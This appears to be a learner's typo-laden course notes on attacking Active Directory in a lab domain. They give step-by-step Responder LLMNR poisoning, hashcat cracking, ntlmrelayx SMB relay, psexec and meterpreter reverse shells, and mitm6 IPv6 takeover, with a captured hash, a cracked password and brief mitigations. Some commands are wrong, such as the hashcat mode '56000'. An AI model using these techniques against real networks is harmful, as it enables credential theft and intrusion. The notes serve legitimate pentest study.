## Physical Active Directory
### Domain Controller
This is the mian server.
- Host a copy of the Active Directory Domain Services AD DS. Stores information about user, computers, printers, etc.
- Provide authentication and authorization. 
- Replicate updates to other domain controllers in the domain.
- Allow administrative access to manage accounts and resources. 

### The AD DS Data Store
Contains the database files nd processes that store and manage directory information for users, services and applucations.
- Consists of the Ntds.dit file - Very sensitive. Contains everything that is stored in Active directory data.
- Is stored by default in the %SystemRoom%\NTDS folder on all domain controller.

## Logical Active Directory

### AD Schema
- Enforces rules regrding object creatin and configuration
- Defies type of object thta can be stored in the directoey.
![[Pasted image 20230522084307.png]]

### Trees domain
![[Pasted image 20230522084520.png]]

### Forest domain
![[Pasted image 20230522084631.png]]






### Organizational Units (Ous)
Ous are Active Directory contains that can store users, groups, computers ad other Ous.
### Trust
Trust provide a mechanism for users to gain access to resources in another domain.
![[Pasted image 20230522084952.png]]




### Objects
![[Pasted image 20230522085031.png]]

## Attacking Active Directory: Initial Attack Vectors
5 was to get admin on active directory: https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

*You are dropped at a random network and you try to pentest!

### (LLMNR Poisining) Link-Local Multicast Name Resolution
- Used to identify hosts when DNS fails to do so. 
- Previously NBT-NS
- Key flaw is that the service utilizes a users username and NTLMv2 hash when appropriately responded to
![[Pasted image 20230524082207.png]]

Step 1: Run Responder
- python Responder.py -l tun0 -rdw
- This needs to happen before everyone start using trafic so before everyonestarts in the morning or after lunch. 
Step 2: An event occurs...
- Somebody typed the wrong networ drive (no dns).
Step 3: We get the hashes and username and ip address. 
Step 4: Crack the hashes
- hascat -m 6600 hashes.txt rockyou.txt

#### Demo attack
1: Run responder
- sudo responder -I eth0 -dwv  
2: type my ip on the windows machine (someone tried to access our machine)
- \\192.168.138.132
3: We get the hash on our machine
- [SMB] NTLMv2-SSP Client   : 192.168.138.150
- [SMB] NTLMv2-SSP Username : MARVEL\Administrator
- [SMB] NTLMv2-SSP Hash     : Administrator::MARVEL:1ac40bed8bb6a341:368E00B3230159D3AAA955CC9DD2FC89:01010000000000008040E7C81B8ED901B9238A180E6A3FD40000000002000800440048004700390001001E00570049004E002D003900590059003500550032004B00480053004200300004003400570049004E002D003900590059003500550032004B0048005300420030002E0044004800470039002E004C004F00430041004C000300140044004800470039002E004C004F00430041004C000500140044004800470039002E004C004F00430041004C00070008008040E7C81B8ED9010600040002000000080030003000000000000000000000000030000012A3B2B2C2700F4D488F97751FA4CC8B1F206A9CEC30B5DF31B6B1CB953345230A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100330038002E003100330032000000000000000000                 
4: Crack the hash
- We need to crach the hash type NTLMv2.
- using haschcat --help we can look for "NTLMv2" and we find the module 5600.
- "hashcat -m 56000 hash.txt  rockyou.txt "
- on Windows ".\hashcat.exe -m 5600 .\hash.txt .\rockyou -O" and we get the "*Pa$ $w0rd"

#### LLMNR Poisoning Defense
- The best way to solve this proble is to disable LLMNR and NBT-NS.


### SMB Relay
#### What is SMB Relay?
Isted of cracking hashes gathered with Responder, we can insted relay those hashes to specific machines and potentially gain access.
#### Requirements
- SMB signing must be disabled on the target.
- Relayed user credentials must be admin on machine. 

Step 1: Run Responder with SMB and HTTP off
- gedit Responder and set SMB and HTTP off
- python Responder.py -l eth0 -rdw
Step 2:  Set up your relay
- python ntlmrelayx.py -tf targets.txt -smb2support
Step 3: An event occurs...
- Somebody typed the wrong networ drive (no dns).
Step 4: We get a connection if the target is admin on the machine.

#### Demo Attck
1:
- We run nmap with a script to check if smb is active.
- "Message signing enabled but not required" this is good
- └─$ nmap --script=smb2-security-mode.nse -p445 192.168.138.0/23
	Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 08:42 BST
	Nmap scan report for 192.168.138.1
	Host is up (0.0020s latency).
	
	PORT    STATE SERVICE
	445/tcp open  microsoft-ds
	
	Host script results:
	| smb2-security-mode: 
	|   311: 
	|_    Message signing enabled but not required
2:
- We set the file with the ip address.
- Edit the Responder.conf file "gedit /etc/responder/Responder.conf", turning off SMB and HTTP.
- And run responder " sudo responder -I eth0 -dwv".
3:
- Go onlyne and download the python script ntlmrelayx.py from https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py and run "sudo python ntlmrelayx.py -tf targets.txt -smb2support", using a -i at the end will return a interactive shell. 
4:
- Now the target machine need to attempt to connect to our machine and we will have the SAM hashes returned to us.
![[Pasted image 20230525164536.png]]




#### SMB Relay Mitigation
- Enable SMB Signing on all devices
- Disable NTLM authentication
- Local admin restricitions

### Gaining SHELL
AFTER GETTING THE CREDENTIALS with LLMNR posining or SMB relay we can use metasploit "psexec" to attack the machine. 
- Searchs for "psexec" on metasploit ans set the rhost, smbdomain to marvel.local, lhost to eth0, smbpass and smbuser.
- Set payload windws/x64/meterpreter/reverse_tcp
If meterpreter is not working or it is being blocked we can try to use the psexec.py insted. https://github.com/fortra/impacket/blob/master/examples/psexec.py
- "sudo psexec.py marvel.local/fcastel:Password1@192.168.138.150"
- More quiete options for this is using "smbexec.py" or "wmiexec.py"



### IPV6 Attacks (more relaiable Relay)
IPV6 does not have a dns controler like ipv4. We can essencially spuff the the DNS system and we will be listening to all of those ipv6 messages that come through and tell the target machine we will handle all their IPV6 messages. After this we will be able to authenticate to the Domanin Controler via LDAP or SMB. Also if we wait for someone to log in to the domain we will get their credentials like SMB Relay/LLMNR.
#### Installing mitm6
- cd / -> cd /opt -> sudo git clone https://github.com/dirkjanm/mitm6.git
- after "cd mitm6", "sudo pip install . " for the requiremnt instalation.

#### IPv6 DNS Takeover via mitm6
- We will run "sudo mitm6 -d marvel.local" and then run "python ntlmrelayx.py -6 -t ldaps://192.168.138.179 -wh fakewpad.marvel.local -l lootme" .
- By doing this we will be listening for the IPV6 connection and act as its dns. We had to reboot the machine to speed it up, but normally the machione sends a request every 30 minutes. After this we will have a file called lootme with so much information about the system.
![[Pasted image 20230530084431.png]]
- We the system is access by a administrator account it will use that to create a user with previlages that we can use to attack the network. 
- Combining NTLM Relays and Kerberos Delegation: [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)


#### IPV6 Mitigation 
![[Pasted image 20230530085707.png]]


### Passback Attacks
A Pen Tester’s Guide to Printer Hacking - [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)
### Attack AD strategies
- begin day with mitm6 or Responder
- Run scans to generate trafic
- If scans are taking to long or you want to be more quite on the network, look for websites in scope (http_version, a module that you can search on metasploit), because websites use normal ports.

- Look for default credentials on web logins
	- Printers
	- Jenkins
	- ETC
- Think outside the box


